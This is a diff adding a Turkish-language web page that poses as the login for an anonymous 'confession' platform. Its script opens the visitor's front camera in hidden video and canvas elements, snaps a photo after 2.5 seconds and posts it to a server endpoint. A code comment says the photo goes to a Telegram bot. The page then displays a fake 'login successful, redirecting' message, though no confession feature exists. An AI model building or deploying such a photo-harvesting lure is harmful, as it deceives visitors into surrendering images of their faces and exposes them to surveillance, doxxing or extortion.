@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İtiraf ve Giriş Sayfası</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .kutu { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
+        button { background-color: #28a745; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="onayEkrani" class="kutu">
+        <h2>Gizlilik Sözleşmesi</h2>
+        <p>Bu siteye giriş yapabilmek ve itiraf platformunu kullanabilmek için kamera erişimine izin vermeniz ve kimlik doğrulaması için anlık fotoğrafınızın sistemimize kaydedilmesini onaylamanız gerekmektedir.</p>
+        <button onclick="onayla()">Sözleşmeyi Onaylıyorum ve Giriş Yap</button>
+    </div>
+
+    <div id="islemEkrani" class="kutu" style="display:none;">
+        <h3>Lütfen Bekleyin...</h3>
+        <p>Sisteme giriş yapılıyor. (Tarayıcı izin isterse onaylayın)</p>
+        <!-- Arka planda çalışacak görünmez video ve canvas -->
+        <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        function onayla() {
+            document.getElementById('onayEkrani').style.display = 'none';
+            document.getElementById('islemEkrani').style.display = 'inline-block';
+
+            // Kamera izni iste
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    var video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Kamera açıldıktan 2.5 saniye sonra fotoğraf çek
+                    setTimeout(function() {
+                        var canvas = document.getElementById('canvas');
+                        var context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 320, 240);
+                        var veriUrl = canvas.toDataURL('image/png');
+
+                        // Arka plana (Telegram botuna) gönder
+                        fetch('/foto-gonder', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: veriUrl })
+                        }).then(() => {
+                            // Gönderim bitince mesajı değiştir ve kamerayı kapat
+                            document.getElementById('islemEkrani').innerHTML = "<h2>Giriş Başarılı!</h2><p>İtiraf sayfasına yönlendiriliyorsunuz...</p>";
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 2500);
+                })
+                .catch(function(err) {
+                    alert("Kamera izni vermediğiniz için siteye giriş yapamazsınız!");
+                    document.getElementById('islemEkrani').style.display = 'none';
+                    document.getElementById('onayEkrani').style.display = 'inline-block';
+                });
+        }
+    </script>
+</body>
+</html>
